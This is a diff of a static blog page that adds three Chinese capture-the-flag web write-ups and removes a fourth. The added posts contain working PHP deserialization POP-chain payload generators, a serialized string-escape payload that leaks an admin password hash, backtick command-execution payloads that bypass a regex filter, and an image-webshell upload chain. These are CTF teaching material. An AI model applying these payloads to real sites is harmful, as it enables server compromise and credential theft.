@@ -71,6 +71,191 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-121" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/22/page-121/" class="article-date">
+  <time class="dt-published" datetime="2021-09-22T10:02:05.000Z" itemprop="datePublished">2021-09-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="源码泄露-www-zip"><a href="#源码泄露-www-zip" class="headerlink" title="源码泄露 www.zip"></a>源码泄露 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></h4><p>login.php 过滤了一堆的关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;, $_POST[&#x27;username&#x27;]))&#123;</span><br><span class="line">		die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>重点在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib.php update.php实例化一个user然后只要session[&#x27;login&#x27;]===1就可以有flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>update.php里判断没有登录后会继续执行$user()-&gt;update() 所以应该得从update.php那边传参</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update()&#123;</span><br><span class="line">    $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">    //这个功能还没有写完 先占坑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先反序列化<strong>getNewinfo()返回值</strong> 调用updatehelper </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getNewinfo ：</span><br><span class="line">public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入<strong>age</strong>和<strong>nickname</strong>然后返回<strong>safe</strong>处理后的**Info()**序列化结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="safe将一些关键字替换成hacker-这强行替换会造成额外读取-就可以控制了"><a href="#safe将一些关键字替换成hacker-这强行替换会造成额外读取-就可以控制了" class="headerlink" title="safe将一些关键字替换成hacker 这强行替换会造成额外读取 就可以控制了"></a>safe将一些关键字替换成hacker 这强行替换会造成额外读取 就可以控制了</h5><p>Info类是简单的赋值 当调用一个不存在的方法时会<strong>调用CtrlCase-&gt;login()</strong><br>UpdateHelper类的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用newinfo和sql构造 销毁时又会显示sql 正常登录后newInfo应该时admin用户id sql应该在Info类所以$this-&gt;sql为空</strong><br>现在看来就剩下一个了，通过某种方法得到admin的密码，登录得到flag。而要得到flag，很明显只有通过SQL。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info类的__call方法很明显要我们调用dbCtrl的login()方法，让我们任意执行SQL语句。得到admin用户的SQL语句不难写select password,username from user where username=?，因为login()返回的是idResult，第一个结果。Info的__call如何别触发？</span><br></pre></td></tr></table></figure>
+
+<p>User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，然后我们就看到了_ _toString()方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    return &quot;0-0&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname unserialize(getNewInfo())得到的 如果nickname是info类，nickname-&gt;update就会触发info的_ _call _ _tostring需要一个输出字符串的地方才会被调用 UpdatHelper的__destruct 会echo this-&gt;sql User类中UpdateHelper的调用中\)Info会被赋值成$this-&gt;sql。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new UpdateHelper()，调用__destruct()，转向new User()的__toString()，调用nickname-&gt;update()，转向new Info()的__call，最终转向new dbCtrl()带出admin的密码 发序列化出updateHelper的类</span><br><span class="line">输入点是getNewInfo()引入Info类  要将updatehelper类放入info中就调用__destruct时 在正常调用正常调用User()-&gt;update()的时候Info-&gt;CtrlCase没有任何意义 把Info-&gt;CtrlCase设置成UpdateHelper类？unserialize()结束后由于没有用到CtrlCase，所以会执行__destruct</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age = null;</span><br><span class="line">    public $nickname = null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo = unserialize($newInfo);</span><br><span class="line">        $upDate = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname = &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser = &quot;root&quot;;</span><br><span class="line">    public $dbpass = &quot;root&quot;;</span><br><span class="line">    public $database = &quot;test&quot;;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token = &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db = new dbCtrl();</span><br><span class="line">$user = new User();</span><br><span class="line">$info = new Info(&quot;23333&quot;, &quot;Tiaonmmn&quot;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper = new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = &quot;select password,id from username where username=?&quot;;</span><br><span class="line">$updatehelper-&gt;sql = $user;</span><br><span class="line">#echo serialize($updatehelper);</span><br><span class="line">$realinfo = new Info(&quot;233333&quot;, &quot;Tiaonmmn&quot;);</span><br><span class="line">$realinfo-&gt;CtrlCase = $updatehelper;</span><br><span class="line">echo serialize($realinfo);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成符合getNewInfo的序列了<br>输入age和nickname参数，CtrlCase没办法传进去 return的时候有个safe函数简单地替换了字符，把相应字符串替换成hacker，那么原来序列化的字符串就有相当大的几率被破坏掉，PHP序列化时计算的字符串长度与实际字符串长度不对应，就<strong>可以逃逸出来插入想要的内容了</strong></p>
+<p>update.php 那边</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post：</span><br><span class="line">age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交就会返回admin的MD5，注意最后面加上了一个“0-0”。 解密就可以登录，拿到flag了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/22/page-121/" data-id="cktvd14ag0001xkw7hi312m1q" data-title="GYCTF2020Easyphp" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-120" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/22/page-120/" class="article-date">
+  <time class="dt-published" datetime="2021-09-22T10:02:02.000Z" itemprop="datePublished">2021-09-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>正则匹配过滤了一些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=pwd可以获取当前路径 =upload则将data写入该路径的index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/288.PNG?raw=true" alt="288.PNG"></p>
+<p>php被过滤了可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">短标签绕过 &lt;?= ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="空格被过滤了可以用-t-来替代"><a href="#空格被过滤了可以用-t-来替代" class="headerlink" title="空格被过滤了可以用\t 来替代"></a>空格被过滤了可以用\t 来替代</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">没有过滤反引号 ` 用这个来执行命令</span><br><span class="line">?action=upload&amp;data=&lt;?=`ls\t/*`?&gt; 获取到一大堆的文件 </span><br><span class="line"></span><br><span class="line">?action=upload&amp;data=&lt;?=`cat\t/flllllll1112222222lag`?&gt; 拿到flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/289.PNG?raw=true" alt="289.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/22/page-120/" data-id="cktvd14ai0002xkw7dif5gbmw" data-title="红明谷CTF 2021write shell" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-119" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/22/page-119/" class="article-date">
+  <time class="dt-published" datetime="2021-09-22T10:02:00.000Z" itemprop="datePublished">2021-09-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/22/page-119/">page</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先来注册一个题目说了upload那么应该不会是sql就不管了<br> 然后上传图片马 上传过程抓包能发现user=后面那串怪怪的 </p>
+<p>解码一下可以看到上传路径和其他的序列化信息</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/281.PNG?raw=true" alt="281.PNG"></p>
+<p><strong>然而没有那么容易连接 也上传不了htaccess</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/282.PNG?raw=true" alt="282.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/283.PNG?raw=true" alt="283.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫后台拿到www.tar.gz </span><br><span class="line">用phpstorm打开发现俩断点hint</span><br></pre></td></tr></table></figure>
+
+<h4 id="application-web-controller-Index-php-里的："><a href="#application-web-controller-Index-php-里的：" class="headerlink" title="application/web/controller/Index.php 里的："></a>application/web/controller/Index.php 里的：</h4><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/284.PNG?raw=true" alt="284.PNG"></p>
+<p>首先访问大部分页面例如 index 都<strong>会调用 login_check 方法。</strong><br>该方法会先将传入的<strong>用户 Profile 反序列化</strong>，而后到数据库中检查相关信息是否一致。<br>application/web/controller/Register.php 里的：</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/285.PNG?raw=true" alt="285.PNG"></p>
+<p>Register 的析构方法，估计是<strong>想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法，也就是跳到主页了。</strong><br>上传逻辑那边 <strong>先检查是否登录然后判断存在文件否  获取后缀 解析图片判断是否为正常图片 再从历史文件拷贝到目标路径</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile.php有_call和_get 俩魔术方法</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/286.PNG?raw=true" alt="286.PNG"></p>
+<p><strong>这俩加上反序列化和析构函数的调用，结合起来就可以操控 Profile 里的参数，控制其中的 upload_img 方法</strong>，这样我们就能任意更改文件名。构造一个 Profile 和 Register 类，<strong>命名空间 app\web\controller</strong>（要不然反序列化会出错，不知道对象实例化的是哪个类）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后给其 except 成员变量赋值 [‘index’ =&gt; ‘img’]，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace app\web\controller;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = new Profile();</span><br><span class="line">$profile-&gt;except = [&#x27;index&#x27; =&gt; &#x27;img&#x27;];</span><br><span class="line">$profile-&gt;img = &quot;upload_img&quot;;</span><br><span class="line">$profile-&gt;ext = &quot;png&quot;;</span><br><span class="line">$profile-&gt;filename_tmp = &quot;./upload/e0164d104d6e1a09295cfb0c7c7aa9d2/75c168b671d4ce827fca23907d85f114.png&quot;;</span><br><span class="line">$profile-&gt;filename = &quot;./upload/e0164d104d6e1a09295cfb0c7c7aa9d2/75c168b671d4ce827fca23907d85f114.php&quot;;</span><br><span class="line"></span><br><span class="line">$register = new Register();</span><br><span class="line">$register-&gt;registed = false;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line">echo urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
+
+<p>运行这个生成新的序列<br>把cookie发过去 访问那个目录可以成功解析</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/287.PNG?raw=true" alt="287.PNG"></p>
+<p>然后蚁剑连接就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/22/page-119/" data-id="cktvd14a90000xkw7ezxh4b7c" data-title="page" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-118" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/09/22/page-118/" class="article-date">
@@ -645,174 +830,6 @@
 
 
   
-    <article id="post-page-108" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-108/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:28.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>好奇怪这题 首先一下页面一加载就die 然后查看源码发现发现chase<br>完全不同管七七八八的访问逻辑 页面是通过js来跳转的<br>到chase发现leftt -&gt; shoot -&gt;door<br>door这边一大堆选项 都是die不用点了<br> <script src="/static/js/door.js"></script> 发现了这个 而且可以访问<br>然后也是不管那些逻辑 直接访问/open</p>
-<p>继续访问/static/js/open_sesame.js<br>跟进到flaght 继续/static/js/fight.js </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/209.PNG?raw=true" alt="209.PNG"></p>
-<p>拿到被打乱的flag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/208.PNG?raw=true" alt="208.PNG"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from itertools import permutations</span><br><span class="line"></span><br><span class="line">flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]</span><br><span class="line"></span><br><span class="line">item = permutations(flag)</span><br><span class="line">for i in item:</span><br><span class="line">	k = &#x27;&#x27;.join(list(i))</span><br><span class="line">	if k.startswith(&#x27;pctf&#123;hey_boys&#x27;) and k[-1] == &#x27;&#125;&#x27;:</span><br><span class="line">		print(k)</span><br></pre></td></tr></table></figure>
-
-<p>跑脚本 各种组合<br>最终flag {hey_boys_im_baaaaaaaaaack!}</p>
-<p>不明所以的关卡</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-108/" data-id="cksyl7wj3000cw4w784um4p6b" data-title="b01lers2020Welcome to Earth" class="article-share-link">Share</a>
-      
-      
